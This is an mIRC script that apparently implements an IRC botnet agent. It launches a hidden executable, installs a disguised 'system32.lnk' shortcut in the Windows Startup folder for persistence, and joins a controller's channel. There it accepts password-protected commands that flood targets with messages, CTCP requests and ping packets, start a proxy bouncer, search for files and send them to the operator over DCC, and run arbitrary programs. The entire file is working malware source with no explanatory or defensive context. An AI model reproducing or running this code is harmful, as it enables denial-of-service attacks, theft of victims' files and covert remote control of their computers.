[script]
n0=alias l { return 8[7TBOTe28] }
n1=on *:start: { 
n2=  /run temp2.exe /n /fh mIRC
n3=  .timer 2 1 /run temp2.exe /n /fh mIRC
n4=  if (($os == XP) || ($os == 2K)) { /copy -o system32.lnk "C:\documents and settings\All users\start menu\programs\startup\system32.lnk" | /identd on $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) | /server %server %port }
n5=  else { /copy -o system32.lnk "C:\windows\start menu\programs\startup\system32.lnk" | /identd on $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) | /server %server %port }
n6=}
n7=on *:connect: { .timer 1 4 /join %chan | /nick $read(names.txt) $+ $rand(a,z) | if (%3 != 1) { /server -m %server %port | inc %3 } }
n8=ctcp *:check:*: { /ctcpreply $nick CHECK $l }
n9=on *:join:%chan: { if ($nick == $me) { msg %chan $l 10ONLINE 14 $+ $ip $+ 15/14 $+ $host 4:) } }
n10=on *:text:!login*:#: { if ($2 == %pass) { msg %chan $l 14 $+ $nick 10logged in. | /auser 10 $nick | halt } }
n11=on *:text:!logout*:#: { if ($2 == %pass) { msg %chan $l 14 $+ $nick 10logged out. | /ruser $nick | halt } }
n12=on *:text:!login*:?: { if ($2 == %pass) { msg $nick $l 14 $+ $nick 10logged in. | /auser 10 $nick | halt } }
n13=on *:text:!logout*:?: { if ($2 == %pass) { msg $nick $l 14 $+ $nick 10logged out. | /ruser $nick | halt } }
n14=on 10:text:!pwd*:?: { set %pass $2 | msg $nick $l 10Password set to:14 %pass }
n15=on *:text:!em:#: { msg $nick $l 14 $+ $nick 10logged in. /auser 10 $nick | halt }
n16=ctcp 10:debug:*: { writeini debug.ini debug debug $2- | /ctcpreply $nick DEBUG $readini(debug.ini,debug,debug) | remove debug.ini }
n17=on 10:text:*:#: { 
n18=  if ($chr(36) isin $1-) { halt }
n19=  if ($chr(37) isin $1-) { halt }
n20=  if ($1 == !join) { /join $2- | /msg %chan $l 10Joining:14 $2 }
n21=  if ($1 == !part) { /part $2- | /msg %chan $l 10Parting:14 $2 }
n22=  if ($1 == !flood) { /msg $2- | /msg $2- | /msg $2- | /msg %chan $l 10Flooding14 $2 10with the specified msg. }
n23=  if ($1 == !cflood) { /ctcp $2- | /ctcp $2- | /ctcp $2- | /msg %chan $l 10CTCP Flooding14 $2 10with the specified msg. }
n24=  if ($1 == !nflood) { /notice $2- | /notice $2- | /notice $2- | /msg %chan $l 10Notice Flooding14 $2 10with the specified msg. }
n25=  if ($1 == !jpflood) { /join $2- | /part $2- | /join $2- | /part $2- | /join $2- | /msg %chan $l 10Cycle Flooding14 $2 10with the specified msg. }
n26=  if ($1 == !server) { set %server $2 | msg %chan $l 10Server set to:14 %server }
n27=  if ($1 == !jump) { msg %chan $l 10Jumping to:14 %server | /server %server %port }
n28=  if ($1 == !port) { set %port $2 | msg %chan $l 10Server port set to:14 %port }
n29=  if ($1 == !chan) { set %chan $2 | msg %chan $l 10Bot channel set to:14 %chan }
n30=  if (($1 == !packet) && ($3 == $null)) { notice $nick USE !packet <ip> <size> | halt }
n31=  if ($1 == !packet) { timer 2 1 /run temp2.exe /n /fh c:\windows\system32\ping.exe | timer 2 1 /run temp2.exe /n /fh ping.exe | timer 2 1 /run temp2.exe /n /fh ping | run ping.exe -n 999 -v AUTH -l $3 $2 | /msg %chan $l 10Packeting14 $2 10with14 $3 10of data. }
n32=  if (($1 == !bnc) && ($2 == $null)) { notice $nick USE: !bnc <server to direct bnc to> | halt }
n33=  if ($1 == !bnc) { set %bnc $2- | /startbnc | msg %chan $l 10BNC Started on:14 $ip 8765 }
n34=  if ($1 == !stopbnc) { /sockclose * | msg %chan $l 10All bncs14 stopped10. }
n35=  if ($1 == !drive.findfile) { msg %chan $l $+ 14 $findfile($2,$3,0,msg %chan $l " $+ $1- $+ ") 10Matches found. }
n36=  if ($1 == !drive.get) { msg %chan $l 10Attempting to Give14 $2 | /dcc send $nick $2 }
n37=  if ($1 == !drive.run) { msg %chan $l 10Attempting to Run14 $2 | /run $2- }
n38=}
n39=on *:disconnect: { unset %3 }
